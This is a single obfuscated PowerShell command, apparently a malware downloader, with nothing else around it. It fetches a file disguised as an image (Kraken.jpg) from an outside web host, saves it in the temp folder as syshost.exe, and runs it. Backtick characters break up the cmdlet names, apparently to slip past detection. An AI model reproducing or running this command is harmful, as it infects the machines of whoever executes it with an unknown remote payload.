$TempDir = [System.IO.Path]::GetTempPath(); (neW`-`objecT System.Net.WebClient).DownloadFile("http://kulup.isikun.edu.tr/Kraken.jpg","  $TempDir\syshost.exe"); s`TaRT $TempDir\syshost.exe;
